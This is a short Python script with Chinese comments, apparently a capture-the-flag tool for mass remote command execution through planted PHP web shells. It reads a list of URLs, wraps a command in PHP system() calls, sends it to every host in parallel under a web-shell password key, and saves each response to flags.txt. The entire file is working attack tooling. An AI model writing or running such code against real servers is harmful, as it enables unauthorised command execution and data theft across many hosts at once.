import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich import print as rich_print  # 导入 rich 的 print 方法，以便输出格式化文本


class PHPConnectionTester:
    def __init__(self):
        self.urls_file = 'urls.txt'
        self.output_file = 'flags.txt'

    def test_php_connection(self, url, key, command, method='POST', use_system=False):
        try:
            # 根据请求的类型和方法构造请求数据
            payload_key = key
            headers = {}
            headers['Content-Type'] = 'application/x-www-form-urlencoded'

            if not use_system:
                command = f"system('{command}');"
            payload = {payload_key: command}

            try:
                # 发送请求
                if method.upper() == 'GET':
                    response = requests.get(url, params=payload, headers=headers, timeout=1)
                else:
                    response = requests.post(url, data=payload, headers=headers, timeout=1)
            except requests.exceptions.Timeout:
                print(f"Request to {url} timed out after 1 second.")
                return

            # 输出结果
            rich_print("=======================================")
            rich_print(f"URL: {url}")
            rich_print(f"Method: {method}")
            rich_print(f"Use System: {'Yes' if use_system else 'No'}")
            rich_print(f"Status Code: {response.status_code}")
            rich_print("=======================================")
            if response.status_code == 200:
                result = response.text
                rich_print(f"Response: {result}")
                # 如果状态码为200，将响应写入到文件中
                with open(self.output_file, 'a', encoding='utf-8') as file:
                    file.write(f"[php][{datetime.now()}] {url} - {result}")
            else:
                rich_print("Failed to execute command.")
        except requests.exceptions.RequestException as e:
            rich_print(f"Request failed: {e}")

    def test_all_urls(
            self, key, command='echo "Connection Successful"', method='POST', use_system=False, max_workers=20
    ):
        try:
            with open(self.urls_file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]

            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_url = {
                    executor.submit(self.test_php_connection, url, key, command, method, use_system): url for url in
                    urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                    except Exception as e:
                        rich_print(f"{url} generated an exception: {e}")
        except FileNotFoundError:
            rich_print(f"File not found: {self.urls_file}")
